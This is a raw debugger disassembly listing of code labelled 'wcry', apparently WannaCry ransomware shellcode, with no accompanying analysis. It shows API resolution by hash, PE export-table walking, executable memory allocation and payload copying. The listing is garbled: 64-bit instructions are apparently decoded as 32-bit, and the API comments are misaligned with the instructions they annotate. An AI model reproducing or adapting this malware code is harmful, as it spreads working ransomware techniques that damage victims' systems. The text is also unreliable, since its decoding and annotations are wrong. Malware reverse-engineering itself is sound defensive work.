00401370        48                      DEC EAX
00401371        89E0                    MOV EAX,ESP
00401373        66:83E4 F0              AND SP,0FFF0
00401377        41                      INC ECX
00401378        57                      PUSH EDI
00401379        41                      INC ECX
0040137A        56                      PUSH ESI
0040137B        41                      INC ECX
0040137C        55                      PUSH EBP
0040137D        41                      INC ECX
0040137E        54                      PUSH ESP
0040137F        53                      PUSH EBX
00401380        51                      PUSH ECX
00401381        52                      PUSH EDX
00401382        55                      PUSH EBP
00401383        57                      PUSH EDI
00401384        56                      PUSH ESI
00401385        50                      PUSH EAX
00401386        50                      PUSH EAX
00401387        E8 BC060000             CALL wcry.00401A48
0040138C        48                      DEC EAX
0040138D        89C3                    MOV EBX,EAX
0040138F        48                      DEC EAX
00401390        B9 DF81143E             MOV ECX,3E1481DF
00401395        0000                    ADD BYTE PTR DS:[EAX],AL
00401397        0000                    ADD BYTE PTR DS:[EAX],AL
00401399        E8 26050000             CALL wcry.004018C4
0040139E        48                      DEC EAX
0040139F        85C0                    TEST EAX,EAX
004013A1        0F84 55030000           JE wcry.004016FC
004013A7        48                      DEC EAX
004013A8        8905 9C070000           MOV DWORD PTR DS:[79C],EAX
004013AE        48                      DEC EAX
004013AF        B9 BA1E03A0             MOV ECX,A0031EBA
004013B4        0000                    ADD BYTE PTR DS:[EAX],AL
004013B6        0000                    ADD BYTE PTR DS:[EAX],AL
004013B8        E8 07050000             CALL wcry.004018C4
004013BD        48                      DEC EAX
004013BE        85C0                    TEST EAX,EAX
004013C0        0F84 36030000           JE wcry.004016FC
004013C6        48                      DEC EAX
004013C7        8905 85070000           MOV DWORD PTR DS:[785],EAX
004013CD        48                      DEC EAX
004013CE        B9 8406E7F9             MOV ECX,F9E70684
004013D3        FFFF                    ???                                                 ;  未知命令
004013D5        FFFF                    ???                                                 ;  未知命令
004013D7        E8 E8040000             CALL wcry.004018C4
004013DC        48                      |DEC EAX
004013DD        85C0                    TEST EAX,EAX
004013DF        0F84 17030000           JE wcry.004016FC
004013E5        48                      DEC EAX
004013E6        8905 6E070000           |MOV DWORD PTR DS:[76E],EAX
004013EC        48                      DEC EAX
004013ED        B9 4FFEEB15             MOV ECX,15EBFE4F
004013F2        0000                    |ADD BYTE PTR DS:[EAX],AL
004013F4        0000                    ADD BYTE PTR DS:[EAX],AL
004013F6        E8 C9040000             CALL wcry.004018C4
004013FB        48                      DEC EAX
004013FC        85C0                    TEST EAX,EAX
004013FE        0F84 F8020000           JE wcry.004016FC
00401404        48                      DEC EAX
00401405        8905 57070000           |MOV DWORD PTR DS:[757],EAX
0040140B        48                      |DEC EAX
0040140C        B9 F930ACA4             |MOV ECX,A4AC30F9
00401411        0000                    |ADD BYTE PTR DS:[EAX],AL
00401413        0000                    ADD BYTE PTR DS:[EAX],AL
00401415        E8 AA040000             CALL wcry.004018C4
0040141A        48                      |DEC EAX
0040141B        85C0                    TEST EAX,EAX
0040141D        0F84 D9020000           JE wcry.004016FC
00401423        48                      DEC EAX
00401424        8905 40070000           MOV DWORD PTR DS:[740],EAX
0040142A        48                      DEC EAX
0040142B        B9 CABED0EC             MOV ECX,ECD0BECA
00401430        0000                    ADD BYTE PTR DS:[EAX],AL
00401432        0000                    ADD BYTE PTR DS:[EAX],AL
00401434        E8 8B040000             CALL wcry.004018C4
00401439        48                      DEC EAX
0040143A        85C0                    |TEST EAX,EAX
0040143C        0F84 BA020000           JE wcry.004016FC
00401442        48                      DEC EAX
00401443        8905 29070000           MOV DWORD PTR DS:[729],EAX
00401449        48                      DEC EAX
0040144A        B9 AEB89F5D             MOV ECX,5D9FB8AE
0040144F        FFFF                    ???                                                 ;  未知命令
00401451        FFFF                    |???                                                ; \ntohs
00401453        E8 6C040000             CALL wcry.004018C4
00401458        48                      DEC EAX
00401459        85C0                    |TEST EAX,EAX                                       ; |Family
0040145B        0F84 9B020000           |JE wcry.004016FC                                   ; |
00401461        48                      DEC EAX
00401462        8905 12070000           MOV DWORD PTR DS:[712],EAX
00401468        48                      DEC EAX
00401469        B9 940169E3             MOV ECX,E3690194
0040146E        FFFF                    ???                                                 ;  未知命令
00401470        FFFF                    |???                                                ;  未知命令
00401472        E8 4D040000             CALL wcry.004018C4
00401477        48                      |DEC EAX                                            ; |Socket
00401478        85C0                    |TEST EAX,EAX                                       ; \connect
0040147A        0F84 7C020000           JE wcry.004016FC
00401480        48                      |DEC EAX
00401481        8905 FB060000           MOV DWORD PTR DS:[6FB],EAX
00401487        48                      DEC EAX
00401488        B9 F61000B8             MOV ECX,B80010F6
0040148D        FFFF                    |???                                                ;  未知命令
0040148F        FFFF                    ???                                                 ;  未知命令
00401491        E8 2E040000             |CALL wcry.004018C4
00401496        48                      |DEC EAX
00401497        85C0                    |TEST EAX,EAX
00401499        0F84 5D020000           JE wcry.004016FC
0040149F        48                      DEC EAX
004014A0        8905 E4060000           |MOV DWORD PTR DS:[6E4],EAX
004014A6        48                      DEC EAX
004014A7        B9 CAD65FD2             MOV ECX,D25FD6CA
004014AC        FFFF                    |???                                                ;  未知命令
004014AE        FFFF                    ???                                                 ;  未知命令
004014B0        E8 0F040000             CALL wcry.004018C4
004014B5        48                      |DEC EAX
004014B6        85C0                    TEST EAX,EAX
004014B8        0F84 3E020000           JE wcry.004016FC
004014BE        48                      |DEC EAX
004014BF        8905 CD060000           MOV DWORD PTR DS:[6CD],EAX
004014C5        48                      DEC EAX
004014C6        B9 79A82411             MOV ECX,1124A879
004014CB        0000                    ADD BYTE PTR DS:[EAX],AL
004014CD        0000                    |ADD BYTE PTR DS:[EAX],AL
004014CF        E8 F0030000             CALL wcry.004018C4
004014D4        48                      DEC EAX
004014D5        85C0                    TEST EAX,EAX
004014D7        0F84 1F020000           JE wcry.004016FC
004014DD        48                      |DEC EAX                                            ; /Socket
004014DE        8905 B6060000           |MOV DWORD PTR DS:[6B6],EAX                         ; \closesocket
004014E4        48                      DEC EAX
004014E5        B9 37C6904F             MOV ECX,4F90C637
004014EA        0000                    ADD BYTE PTR DS:[EAX],AL
004014EC        0000                    ADD BYTE PTR DS:[EAX],AL
004014EE        E8 D1030000             CALL wcry.004018C4
004014F3        48                      DEC EAX
004014F4        85C0                    |TEST EAX,EAX
004014F6        0F84 00020000           JE wcry.004016FC
004014FC        48                      DEC EAX
004014FD        8905 9F060000           MOV DWORD PTR DS:[69F],EAX
00401503        48                      DEC EAX
00401504        B9 6CE7FE10             MOV ECX,10FEE76C
00401509        0000                    ADD BYTE PTR DS:[EAX],AL
0040150B        0000                    ADD BYTE PTR DS:[EAX],AL
0040150D        E8 B2030000             |CALL wcry.004018C4
00401512        48                      |DEC EAX
00401513        85C0                    TEST EAX,EAX
00401515        0F84 E1010000           |JE wcry.004016FC
0040151B        48                      DEC EAX
0040151C        8905 88060000           |MOV DWORD PTR DS:[688],EAX
00401522        E8 4F030000             CALL wcry.00401876
00401527        8B05 85060000           MOV EAX,DWORD PTR DS:[685]
0040152D        85C0                    |TEST EAX,EAX
0040152F        0F84 C7010000           JE wcry.004016FC
00401535        E8 D9010000             CALL wcry.00401713
0040153A        48                      DEC EAX
0040153B        85C0                    |TEST EAX,EAX
0040153D        0F84 B9010000           JE wcry.004016FC
00401543        4C                      DEC ESP
00401544        8D0D 94060000           |LEA ECX,DWORD PTR DS:[694]                         ; /Flags
0040154A        41                      INC ECX
0040154B        8B09                    MOV ECX,DWORD PTR DS:[ECX]
0040154D        51                      |PUSH ECX                                           ; |
0040154E        51                      PUSH ECX
0040154F        6A 40                   PUSH 40
00401551        68 00100000             |PUSH 1000                                          ; |Socket = 1000
00401556        4D                      DEC EBP
00401557        31C0                    |XOR EAX,EAX
00401559        48                      DEC EAX
0040155A        8D15 D2050000           |LEA EDX,DWORD PTR DS:[5D2]
00401560        48                      |DEC EAX
00401561        B9 FFFFFFFF             MOV ECX,-1
00401566        FFFF                    ???                                                 ;  未知命令
00401568        FFFF                    ???                                                 ;  未知命令
0040156A        48                      DEC EAX
0040156B        83EC 20                 SUB ESP,20
0040156E        FF15 06060000           CALL DWORD PTR DS:[606]
00401574        48                      DEC EAX
00401575        83C4 38                 ADD ESP,38
00401578        59                      POP ECX
00401579        890D 5F060000           MOV DWORD PTR DS:[65F],ECX
0040157F        48                      DEC EAX
00401580        85C0                    TEST EAX,EAX
00401582        0F85 22010000           JNZ wcry.004016AA
00401588        48                      DEC EAX
00401589        8D35 57060000           |LEA ESI,DWORD PTR DS:[657]
0040158F        48                      DEC EAX
00401590        8B3D 9C050000           MOV EDI,DWORD PTR DS:[59C]
00401596        F3:A4                   REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]
00401598        803D 2F060000 01        CMP BYTE PTR DS:[62F],1
0040159F        74 05                   |JE SHORT wcry.004015A6                             ; |
004015A1        E8 96020000             CALL wcry.0040183C
004015A6        48                      DEC EAX
004015A7        8B35 4D050000           MOV ESI,DWORD PTR DS:[54D]
004015AD        8B0D 0F060000           MOV ECX,DWORD PTR DS:[60F]
004015B3        48                      DEC EAX
004015B4        01CE                    ADD ESI,ECX
004015B6        48                      |DEC EAX
004015B7        89F1                    MOV ECX,ESI
004015B9        44                      INC ESP
004015BA        8B25 06060000           MOV ESP,DWORD PTR DS:[606]
004015C0        48                      |DEC EAX                                            ; |s1
004015C1        8B11                    |MOV EDX,DWORD PTR DS:[ECX]                         ; \_stricmp
004015C3        48                      DEC EAX
004015C4        39D6                    CMP ESI,EDX
004015C6        0F84 DE000000           JE wcry.004016AA
004015CC        48                      |DEC EAX
004015CD        31C0                    XOR EAX,EAX
004015CF        8B05 DD050000           MOV EAX,DWORD PTR DS:[5DD]
004015D5        48                      |DEC EAX
004015D6        29C2                    SUB EDX,EAX
004015D8        51                      PUSH ECX
004015D9        52                      PUSH EDX
004015DA        48                      DEC EAX
004015DB        89D1                    MOV ECX,EDX
004015DD        48                      DEC EAX
004015DE        83EC 20                 SUB ESP,20
004015E1        FF15 C3050000           CALL DWORD PTR DS:[5C3]
004015E7        48                      DEC EAX
004015E8        83C4 20                 ADD ESP,20
004015EB        5A                      POP EDX
004015EC        59                      POP ECX
004015ED        48                      DEC EAX
004015EE        85C0                    TEST EAX,EAX
004015F0        74 2E                   |JE SHORT wcry.00401620
004015F2        4D                      DEC EBP
004015F3        31C9                    |XOR ECX,ECX
004015F5        44                      |INC ESP
004015F6        8B0D CE050000           MOV ECX,DWORD PTR DS:[5CE]
004015FC        4A                      DEC EDX
004015FD        8B0408                  MOV EAX,DWORD PTR DS:[EAX+ECX]
00401600        48                      DEC EAX
00401601        85C0                    TEST EAX,EAX
00401603        74 1B                   JE SHORT wcry.00401620
00401605        4C                      |DEC ESP
00401606        01E2                    ADD EDX,ESP
00401608        803D BF050000 01        CMP BYTE PTR DS:[5BF],1
0040160F        74 07                   JE SHORT wcry.00401618
00401611        803A 01                 CMP BYTE PTR DS:[EDX],1
00401614        74 0F                   JE SHORT wcry.00401625
00401616        EB 08                   JMP SHORT wcry.00401620
00401618        8B02                    MOV EAX,DWORD PTR DS:[EDX]
0040161A        0FBAE0 05               BT EAX,5
0040161E        72 05                   JB SHORT wcry.00401625
00401620        48                      DEC EAX
00401621        8B09                    MOV ECX,DWORD PTR DS:[ECX]
00401623      ^ EB 9B                   JMP SHORT wcry.004015C0
00401625        4C                      DEC ESP
00401626        29E2                    SUB EDX,ESP
00401628        48                      DEC EAX
00401629        8915 0B050000           MOV DWORD PTR DS:[50B],EDX
0040162F        48                      DEC EAX
00401630        BA 90000000             MOV EDX,90
00401635        0000                    ADD BYTE PTR DS:[EAX],AL
00401637        0000                    ADD BYTE PTR DS:[EAX],AL
00401639        48                      DEC EAX
0040163A        31C9                    XOR ECX,ECX                                         ; /Socket
0040163C        48                      DEC EAX
0040163D        83EC 40                 SUB ESP,40
00401640        FF15 3C050000           CALL DWORD PTR DS:[53C]
00401646        48                      DEC EAX
00401647        83C4 40                 ADD ESP,40
0040164A        48                      DEC EAX                                             ; \Sleep
0040164B        85C0                    TEST EAX,EAX
0040164D        74 5B                   JE SHORT wcry.004016AA
0040164F        48                      DEC EAX
00401650        8905 EC040000           MOV DWORD PTR DS:[4EC],EAX
00401656        C680 80000000 C3        MOV BYTE PTR DS:[EAX+80],0C3
0040165D        48                      DEC EAX
0040165E        31C9                    XOR ECX,ECX
00401660        51                      PUSH ECX
00401661        6A 01                   PUSH 1
00401663        FF35 C9040000           PUSH DWORD PTR DS:[4C9]
00401669        51                      PUSH ECX
0040166A        4C                      DEC ESP
0040166B        8D88 80000000           LEA ECX,DWORD PTR DS:[EAX+80]
00401671        4D                      DEC EBP
00401672        31C0                    XOR EAX,EAX
00401674        48                      DEC EAX
00401675        8B15 BF040000           MOV EDX,DWORD PTR DS:[4BF]
0040167B        48                      DEC EAX
0040167C        89C1                    MOV ECX,EAX
0040167E        48                      DEC EAX
0040167F        83EC 20                 SUB ESP,20
00401682        FF15 02050000           CALL DWORD PTR DS:[502]
00401688        48                      DEC EAX
00401689        83C4 40                 ADD ESP,40
0040168C        4D                      DEC EBP
0040168D        31C9                    XOR ECX,ECX
0040168F        4D                      DEC EBP
00401690        31C0                    XOR EAX,EAX
00401692        48                      DEC EAX
00401693        31D2                    XOR EDX,EDX
00401695        48                      DEC EAX
00401696        8B0D A6040000           MOV ECX,DWORD PTR DS:[4A6]
0040169C        48                      DEC EAX
0040169D        83EC 20                 SUB ESP,20
004016A0        FF15 EC040000           CALL DWORD PTR DS:[4EC]
004016A6        48                      DEC EAX
004016A7        83C4 20                 ADD ESP,20
004016AA        48                      DEC EAX
004016AB        83EC 20                 SUB ESP,20
004016AE        48                      DEC EAX
004016AF        8D0D 4D040000           LEA ECX,DWORD PTR DS:[44D]
004016B5        FF15 AF040000           CALL DWORD PTR DS:[4AF]
004016BB        48                      DEC EAX
004016BC        8B0D 38040000           MOV ECX,DWORD PTR DS:[438]
004016C2        FF15 AA040000           CALL DWORD PTR DS:[4AA]
004016C8        48                      DEC EAX
004016C9        83C4 20                 ADD ESP,20
004016CC        48                      DEC EAX
004016CD        31C0                    XOR EAX,EAX
004016CF        48                      DEC EAX
004016D0        8D3D 9AFCFFFF           LEA EDI,DWORD PTR DS:[FFFFFC9A]
004016D6        48                      DEC EAX
004016D7        B9 70030000             MOV ECX,370
004016DC        0000                    ADD BYTE PTR DS:[EAX],AL
004016DE        0000                    ADD BYTE PTR DS:[EAX],AL
004016E0        F3:AA                   REP STOS BYTE PTR ES:[EDI]
004016E2        48                      DEC EAX                                             ; /pPerformanceFreq
004016E3        8D3D 2A000000           LEA EDI,DWORD PTR DS:[2A]                           ; \QueryPerformanceFrequency
004016E9        48                      DEC EAX
004016EA        B9 D3040000             MOV ECX,4D3
004016EF        0000                    ADD BYTE PTR DS:[EAX],AL
004016F1        0000                    ADD BYTE PTR DS:[EAX],AL
004016F3        48                      DEC EAX
004016F4        030D E4040000           ADD ECX,DWORD PTR DS:[4E4]
004016FA        F3:AA                   REP STOS BYTE PTR ES:[EDI]
004016FC        58                      POP EAX
004016FD        58                      POP EAX
004016FE        5E                      POP ESI                                             ; /Timeout
004016FF        5F                      POP EDI                                             ; \Sleep
00401700        5D                      POP EBP
00401701        5A                      POP EDX
00401702        59                      POP ECX
00401703        5B                      POP EBX
00401704        41                      INC ECX
00401705        5C                      POP ESP
00401706        41                      INC ECX
00401707        5D                      POP EBP
00401708        41                      INC ECX
00401709        5E                      POP ESI
0040170A        41                      INC ECX
0040170B        5F                      POP EDI
0040170C        48                      DEC EAX
0040170D        89C4                    MOV ESP,EAX
0040170F        48                      DEC EAX
00401710        31C0                    XOR EAX,EAX
00401712        C3                      RETN
00401713        53                      PUSH EBX
00401714        56                      PUSH ESI
00401715        51                      PUSH ECX
00401716        52                      PUSH EDX
00401717        48                      DEC EAX
00401718        B9 08000000             MOV ECX,8
0040171D        0000                    ADD BYTE PTR DS:[EAX],AL
0040171F        0000                    ADD BYTE PTR DS:[EAX],AL
00401721        51                      PUSH ECX
00401722        48                      DEC EAX
00401723        8D15 D1030000           LEA EDX,DWORD PTR DS:[3D1]
00401729        48                      DEC EAX
0040172A        83EC 20                 SUB ESP,20
0040172D        FF15 17040000           CALL DWORD PTR DS:[417]
00401733        48                      DEC EAX
00401734        83C4 20                 ADD ESP,20
00401737        48                      DEC EAX
00401738        85C0                    TEST EAX,EAX
0040173A        0F85 DD000000           JNZ wcry.0040181D
00401740        48                      DEC EAX
00401741        8B35 B3030000           MOV ESI,DWORD PTR DS:[3B3]
00401747        48                      DEC EAX
00401748        31DB                    XOR EBX,EBX
0040174A        8B1D 66040000           MOV EBX,DWORD PTR DS:[466]                          ; \QueryPerformanceCounter
00401750        8B041E                  MOV EAX,DWORD PTR DS:[ESI+EBX]
00401753        83F8 02                 CMP EAX,2
00401756        0F8C B0000000           JL wcry.0040180C
0040175C        48                      DEC EAX
0040175D        89F1                    MOV ECX,ESI
0040175F        48                      DEC EAX
00401760        83EC 20                 SUB ESP,20
00401763        FF15 E9030000           CALL DWORD PTR DS:[3E9]
00401769        48                      DEC EAX
0040176A        83C4 20                 ADD ESP,20
0040176D        E8 57020000             CALL wcry.004019C9
00401772        8B0D 5A040000           MOV ECX,DWORD PTR DS:[45A]
00401778        39C8                    CMP EAX,ECX
0040177A        0F85 8C000000           JNZ wcry.0040180C
00401780        48                      DEC EAX
00401781        8D15 7B030000           LEA EDX,DWORD PTR DS:[37B]
00401787        48                      DEC EAX
00401788        89F1                    MOV ECX,ESI
0040178A        48                      DEC EAX
0040178B        83EC 20                 /SUB ESP,20
0040178E        FF15 C6030000           CALL DWORD PTR DS:[3C6]
00401794        48                      DEC EAX
00401795        89F1                    MOV ECX,ESI
00401797        FF15 C5030000           CALL DWORD PTR DS:[3C5]
0040179D        48                      DEC EAX
0040179E        83C4 20                 ADD ESP,20
004017A1        48                      DEC EAX
004017A2        85C0                    \TEST EAX,EAX
004017A4        74 49                   JE SHORT wcry.004017EF
004017A6        48                      DEC EAX
004017A7        31DB                    XOR EBX,EBX
004017A9        8B1D 0B040000           MOV EBX,DWORD PTR DS:[40B]
004017AF        48                      DEC EAX
004017B0        8B0418                  MOV EAX,DWORD PTR DS:[EAX+EBX]
004017B3        48                      DEC EAX
004017B4        85C0                    TEST EAX,EAX
004017B6        74 37                   JE SHORT wcry.004017EF
004017B8        48                      DEC EAX
004017B9        31C9                    XOR ECX,ECX
004017BB        8B1D FD030000           MOV EBX,DWORD PTR DS:[3FD]
004017C1        66:8B0C18               MOV CX,WORD PTR DS:[EAX+EBX]
004017C5        48                      DEC EAX
004017C6        8B4418 08               MOV EAX,DWORD PTR DS:[EAX+EBX+8]
004017CA        48                      DEC EAX
004017CB        85C0                    TEST EAX,EAX
004017CD        74 20                   JE SHORT wcry.004017EF
004017CF        48                      DEC EAX
004017D0        31DB                    XOR EBX,EBX
004017D2        8B1D 02040000           MOV EBX,DWORD PTR DS:[402]
004017D8        48                      DEC EAX
004017D9        29D9                    SUB ECX,EBX
004017DB        7C 12                   JL SHORT wcry.004017EF                              ; |format
004017DD        48                      DEC EAX
004017DE        01C8                    ADD EAX,ECX
004017E0        E8 2B020000             CALL wcry.00401A10                                  ; |s
004017E5        8B0D EB030000           MOV ECX,DWORD PTR DS:[3EB]
004017EB        39C8                    CMP EAX,ECX
004017ED        74 3F                   JE SHORT wcry.0040182E
004017EF        31C0                    XOR EAX,EAX
004017F1        8905 03030000           MOV DWORD PTR DS:[303],EAX
004017F7        48                      DEC EAX
004017F8        8D0D 04030000           LEA ECX,DWORD PTR DS:[304]
004017FE        48                      DEC EAX
004017FF        83EC 20                 SUB ESP,20
00401802        FF15 62030000           CALL DWORD PTR DS:[362]
00401808        48                      DEC EAX
00401809        83C4 20                 ADD ESP,20
0040180C        48                      DEC EAX
0040180D        89F1                    MOV ECX,ESI
0040180F        48                      DEC EAX
00401810        83EC 20                 SUB ESP,20
00401813        FF15 59030000           CALL DWORD PTR DS:[359]
00401819        48                      DEC EAX
0040181A        83C4 20                 ADD ESP,20
0040181D        59                      POP ECX
0040181E        81F9 00000100           CMP ECX,10000
00401824        7F 0E                   JG SHORT wcry.00401834
00401826        83C1 04                 ADD ECX,4
00401829      ^ E9 F3FEFFFF             JMP wcry.00401721
0040182E        59                      POP ECX
0040182F        48                      DEC EAX
00401830        89F0                    MOV EAX,ESI
00401832        EB 03                   JMP SHORT wcry.00401837
00401834        48                      DEC EAX
00401835        31C0                    XOR EAX,EAX
00401837        5A                      POP EDX
00401838        59                      POP ECX
00401839        5E                      POP ESI
0040183A        5B                      POP EBX
0040183B        C3                      RETN
0040183C        48                      DEC EAX
0040183D        8B35 B7020000           MOV ESI,DWORD PTR DS:[2B7]
00401843        8B0D 79030000           MOV ECX,DWORD PTR DS:[379]
00401849        48                      DEC EAX
0040184A        01CE                    ADD ESI,ECX
0040184C        48                      DEC EAX
0040184D        8B16                    MOV EDX,DWORD PTR DS:[ESI]
0040184F        8B05 5D030000           MOV EAX,DWORD PTR DS:[35D]
00401855        48                      DEC EAX
00401856        29C2                    SUB EDX,EAX
00401858        48                      DEC EAX
00401859        31C0                    XOR EAX,EAX
0040185B        48                      DEC EAX
0040185C        FFC8                    DEC EAX
0040185E        48                      DEC EAX
0040185F        C1E0 2C                 SHL EAX,2C                                          ;  移位常量超出 1..31 的范围
00401862        48                      DEC EAX
00401863        8B12                    MOV EDX,DWORD PTR DS:[EDX]
00401865        48                      DEC EAX
00401866        39C2                    CMP EDX,EAX
00401868        72 0B                   JB SHORT wcry.00401875
0040186A        B8 E8030000             MOV EAX,3E8
0040186F        8905 3D030000           MOV DWORD PTR DS:[33D],EAX
00401875        C3                      RETN
00401876        56                      PUSH ESI
00401877        51                      PUSH ECX
00401878        52                      PUSH EDX
00401879        48                      DEC EAX
0040187A        83EC 20                 SUB ESP,20
0040187D        FF15 1F030000           CALL DWORD PTR DS:[31F]
00401883        48                      DEC EAX
00401884        89C6                    MOV ESI,EAX
00401886        8B05 36030000           MOV EAX,DWORD PTR DS:[336]
0040188C        48                      DEC EAX
0040188D        01C6                    ADD ESI,EAX
0040188F        FF15 05030000           CALL DWORD PTR DS:[305]
00401895        48                      DEC EAX
00401896        89F1                    MOV ECX,ESI
00401898        48                      DEC EAX
00401899        39F0                    CMP EAX,ESI
0040189B        77 17                   JA SHORT wcry.004018B4
0040189D        48                      DEC EAX
0040189E        8D90 00050000           LEA EDX,DWORD PTR DS:[EAX+500]
004018A4        48                      DEC EAX
004018A5        39F2                    CMP EDX,ESI
004018A7        72 0B                   JB SHORT wcry.004018B4
004018A9        48                      DEC EAX
004018AA        29C6                    SUB ESI,EAX
004018AC        8935 00030000           MOV DWORD PTR DS:[300],ESI
004018B2        EB 08                   JMP SHORT wcry.004018BC
004018B4        48                      DEC EAX
004018B5        8B36                    MOV ESI,DWORD PTR DS:[ESI]
004018B7        48                      DEC EAX
004018B8        39CE                    CMP ESI,ECX
004018BA      ^ 75 DC                   JNZ SHORT wcry.00401898
004018BC        48                      DEC EAX
004018BD        83C4 20                 ADD ESP,20
004018C0        5A                      POP EDX
004018C1        59                      POP ECX
004018C2        5E                      POP ESI
004018C3        C3                      RETN
004018C4        53                      PUSH EBX
004018C5        52                      PUSH EDX
004018C6        51                      PUSH ECX
004018C7        55                      PUSH EBP
004018C8        48                      DEC EAX
004018C9        89E5                    MOV EBP,ESP
004018CB        48                      DEC EAX
004018CC        81EC 00010000           SUB ESP,100
004018D2        57                      PUSH EDI
004018D3        48                      DEC EAX
004018D4        89CF                    MOV EDI,ECX
004018D6        48                      DEC EAX
004018D7        89D8                    MOV EAX,EBX
004018D9        48                      DEC EAX
004018DA        8985 00FFFFFF           MOV DWORD PTR SS:[EBP-100],EAX
004018E0        E8 BB000000             CALL wcry.004019A0
004018E5        48                      DEC EAX
004018E6        8985 08FFFFFF           MOV DWORD PTR SS:[EBP-F8],EAX
004018EC        E8 48010000             CALL wcry.00401A39
004018F1        48                      DEC EAX
004018F2        8985 10FFFFFF           MOV DWORD PTR SS:[EBP-F0],EAX
004018F8        48                      DEC EAX
004018F9        8B85 00FFFFFF           MOV EAX,DWORD PTR SS:[EBP-100]
004018FF        48                      DEC EAX
00401900        8B8D 08FFFFFF           MOV ECX,DWORD PTR SS:[EBP-F8]
00401906        E8 9A010000             CALL wcry.00401AA5
0040190B        48                      DEC EAX
0040190C        8985 18FFFFFF           MOV DWORD PTR SS:[EBP-E8],EAX
00401912        48                      DEC EAX
00401913        8B85 00FFFFFF           MOV EAX,DWORD PTR SS:[EBP-100]
00401919        48                      DEC EAX
0040191A        8B8D 08FFFFFF           MOV ECX,DWORD PTR SS:[EBP-F8]
00401920        E8 8F010000             CALL wcry.00401AB4
00401925        48                      DEC EAX
00401926        8985 20FFFFFF           MOV DWORD PTR SS:[EBP-E0],EAX
0040192C        48                      DEC EAX
0040192D        8B85 00FFFFFF           MOV EAX,DWORD PTR SS:[EBP-100]
00401933        48                      DEC EAX
00401934        8B8D 08FFFFFF           MOV ECX,DWORD PTR SS:[EBP-F8]
0040193A        E8 84010000             CALL wcry.00401AC3
0040193F        48                      DEC EAX
00401940        8985 28FFFFFF           MOV DWORD PTR SS:[EBP-D8],EAX
00401946        48                      DEC EAX
00401947        8B85 00FFFFFF           MOV EAX,DWORD PTR SS:[EBP-100]
0040194D        48                      DEC EAX
0040194E        89F9                    MOV ECX,EDI
00401950        48                      DEC EAX
00401951        8B95 20FFFFFF           MOV EDX,DWORD PTR SS:[EBP-E0]
00401957        48                      DEC EAX
00401958        8B9D 10FFFFFF           MOV EBX,DWORD PTR SS:[EBP-F0]
0040195E        E8 0F010000             CALL wcry.00401A72
00401963        48                      DEC EAX
00401964        8985 30FFFFFF           MOV DWORD PTR SS:[EBP-D0],EAX
0040196A        48                      DEC EAX
0040196B        8B85 28FFFFFF           MOV EAX,DWORD PTR SS:[EBP-D8]
00401971        48                      DEC EAX
00401972        8B8D 30FFFFFF           MOV ECX,DWORD PTR SS:[EBP-D0]
00401978        E8 55010000             CALL wcry.00401AD2
0040197D        66:89C2                 MOV DX,AX
00401980        48                      DEC EAX
00401981        8B85 00FFFFFF           MOV EAX,DWORD PTR SS:[EBP-100]
00401987        48                      DEC EAX
00401988        8B8D 18FFFFFF           MOV ECX,DWORD PTR SS:[EBP-E8]
0040198E        E8 49010000             CALL wcry.00401ADC
00401993        5F                      POP EDI
00401994        48                      DEC EAX
00401995        81C4 00010000           ADD ESP,100
0040199B        5D                      POP EBP
0040199C        59                      POP ECX
0040199D        5A                      POP EDX
0040199E        5B                      POP EBX
0040199F        C3                      RETN
004019A0        56                      PUSH ESI
004019A1        57                      PUSH EDI
004019A2        48                      DEC EAX
004019A3        31F6                    XOR ESI,ESI
004019A5        8B70 3C                 MOV ESI,DWORD PTR DS:[EAX+3C]
004019A8        48                      DEC EAX
004019A9        01C6                    ADD ESI,EAX
004019AB        66:813E 5045            CMP WORD PTR DS:[ESI],4550                          ; /pAddr
004019B0        75 12                   JNZ SHORT wcry.004019C4
004019B2        48                      DEC EAX
004019B3        81C6 88000000           ADD ESI,88
004019B9        48                      DEC EAX
004019BA        31FF                    XOR EDI,EDI
004019BC        8B3E                    MOV EDI,DWORD PTR DS:[ESI]                          ; /NetShort
004019BE        48                      DEC EAX
004019BF        01F8                    ADD EAX,EDI
004019C1        5F                      POP EDI
004019C2        5E                      POP ESI                                             ; /Protocol
004019C3        C3                      RETN
004019C4        48                      DEC EAX                                             ; |Type
004019C5        31C0                    XOR EAX,EAX
004019C7      ^ EB F8                   JMP SHORT wcry.004019C1
004019C9        56                      PUSH ESI
004019CA        51                      PUSH ECX
004019CB        57                      PUSH EDI
004019CC        48                      DEC EAX
004019CD        89C6                    MOV ESI,EAX                                         ; \socket
004019CF        48                      DEC EAX
004019D0        31C0                    XOR EAX,EAX
004019D2        89C7                    MOV EDI,EAX
004019D4        C1E7 07                 SHL EDI,7
004019D7        29C7                    SUB EDI,EAX
004019D9        89F8                    MOV EAX,EDI
004019DB        31C9                    XOR ECX,ECX
004019DD        8A0E                    MOV CL,BYTE PTR DS:[ESI]
004019DF        80F9 00                 CMP CL,0
004019E2        74 07                   JE SHORT wcry.004019EB
004019E4        01C8                    ADD EAX,ECX                                         ; |Socket
004019E6        48                      DEC EAX
004019E7        FFC6                    INC ESI
004019E9      ^ EB E7                   JMP SHORT wcry.004019D2
004019EB        5F                      POP EDI
004019EC        59                      POP ECX
004019ED        5E                      POP ESI
004019EE        C3                      RETN
004019EF        56                      PUSH ESI
004019F0        57                      PUSH EDI
004019F1        52                      PUSH EDX
004019F2        48                      DEC EAX
004019F3        89C6                    MOV ESI,EAX                                         ; /Flags
004019F5        48                      DEC EAX                                             ; |DataSize
004019F6        31C0                    XOR EAX,EAX
004019F8        89C7                    MOV EDI,EAX
004019FA        C1E7 07                 SHL EDI,7
004019FD        29C7                    SUB EDI,EAX                                         ; \send
004019FF        89F8                    MOV EAX,EDI
00401A01        31D2                    XOR EDX,EDX
00401A03        8A16                    MOV DL,BYTE PTR DS:[ESI]
00401A05        01D0                    ADD EAX,EDX
00401A07        48                      DEC EAX
00401A08        FFC6                    INC ESI
00401A0A      ^ E2 EC                   LOOPD SHORT wcry.004019F8
00401A0C        5A                      POP EDX
00401A0D        5F                      POP EDI                                             ; |
00401A0E        5E                      POP ESI
00401A0F        C3                      RETN
00401A10        56                      PUSH ESI
00401A11        51                      PUSH ECX                                            ; |BufSize
00401A12        57                      PUSH EDI
00401A13        48                      DEC EAX
00401A14        89C6                    MOV ESI,EAX
00401A16        48                      DEC EAX                                             ; |Buffer
00401A17        31C0                    XOR EAX,EAX                                         ; |Socket
00401A19        89C7                    MOV EDI,EAX
00401A1B        C1E7 07                 SHL EDI,7
00401A1E        29C7                    SUB EDI,EAX
00401A20        89F8                    MOV EAX,EDI
